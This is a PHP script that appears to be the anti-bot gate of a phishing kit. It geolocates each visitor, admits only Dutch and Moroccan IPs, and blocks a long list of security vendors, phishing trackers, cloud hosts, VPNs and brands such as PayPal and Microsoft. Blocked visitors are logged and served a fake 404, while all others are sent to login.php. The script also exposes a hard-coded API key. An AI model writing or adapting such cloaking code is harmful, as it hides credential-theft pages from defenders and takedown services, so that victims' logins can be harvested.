<?php
session_start();
$allowed_countries = array('NL', 'MA');
$blocked_strings = array(
   'M247', 'Amazone', 'DigitalOcean', 'Amazon', 'Google', 'phishtank', 'net4sec', 'AVAST Software s.r.o.', 'BullGuard ApS', 'PayPal', 'Hotmail', 'Yahoo', 'AOL', 'Microsoft', 'Kaspersky Lab', 'Linode', 'MSN', 'ONLINE S.A.S.', 'Joshua Peter McQuistan', 'OVH SAS', 'avira', 'Forcepoint', 'Cloud', 'Forcepoint Cloud Ltd', 'Google', 'Facebook', 'HostRoyale', 'Green Floid LLC', 'The Constant Company', 'ONLINE S.A.S', 'H4Y Technologies', 'Datacamp Limited', 'Digital Network', 'Intelligence Network Online', 'Geekyworks IT Solutions', 'The Calyx Institute', 'Perimeter', 'TerraTransit', 'Hurricane Electric', 'Uninet S.A.', 'AVAST', 'Microsense', 'PALO ALTO NETWORKS', 'ServeByte', 'Fastly', 'Google LLC', 'Overplay', 'Netprotect', 'Strong Technology', 'Web2Objects', 'tzulo', 'NETPROTECT', 'GleSYS', 'Cloudflare', 'Cloudflare, Inc.', 'Axera SpA', 'Axera S.P.A.', 'DedFiberCo', 'VISPERAD NETWORKS', 'EGIHosting', 'NAVER Cloud', 'Dreamx', 'DIMENOC SERVICOS DE INFORMATICA', 'HostDime', 'Powerhouse', 'Powerhouse Management', 'Unus, Inc.', 'Cisco', 'Cisco OpenDNS LLC', 'Twitter', 'Hetzner', 'Telegram', 'TEFINCOM', 'Tefincom', 'Packethub', 'AWS EC2', 'Forcepoint Cloud', 'Forcepoint', 'Paradise Networks', 'CenturyLink Communications', 'NEXT GLOBAL SERVICES', 'Next Global Services', 'UAB code200', 'Ovh', 'ovh', 'Liteserver', 'Leaseweb', 'Space Exploration Technologies', 'SpaceX Services', 'SpaceX Services, Inc', 'UNINET', 'Jisc Services', 'University of Bath', 'Bath University', 'Synergy Wholesale PTY LTD', 'SYNERGY WHOLESALE PTY LTD', 'IPXO UK LIMITED', 'Ipxo UK Limited', 'QuickPacket', 'BraveWay', 'Geekyworks', 'NETROTECT-BOM', 'myLoc', 'Microplex', 'SCALEWAY', 'Datacamp', 'INCX Global', 'Windscribe'
);

function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=s3DD9L9nYAxD9mz");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

function containsBlockedString($ipinfo_json, $blocked_strings)
{
    foreach ($blocked_strings as $blocked_string) {
        if (stripos(json_encode($ipinfo_json), $blocked_string) !== false) {
            return true;
        }
    }
    return false;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);
$country_code = "{$ipinfo_json['countryCode']}";

if (!in_array($country_code, $allowed_countries) || containsBlockedString($ipinfo_json, $blocked_strings)) {
    $blocked_ip_file = fopen("botdl5ra.txt", "a");
    $blocked_ip_info = $visitor_ip . " - ISP: " . $ipinfo_json['isp'] . " - ORG: " . $ipinfo_json['org'] . " - " . gmdate("Y-n-d") . " @ " . gmdate("H:i:s") . "\n";
    fwrite($blocked_ip_file, $blocked_ip_info);
    fclose($blocked_ip_file);

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    echo "404 Not Found";
    exit();
}


header("Location: login.php");
?>
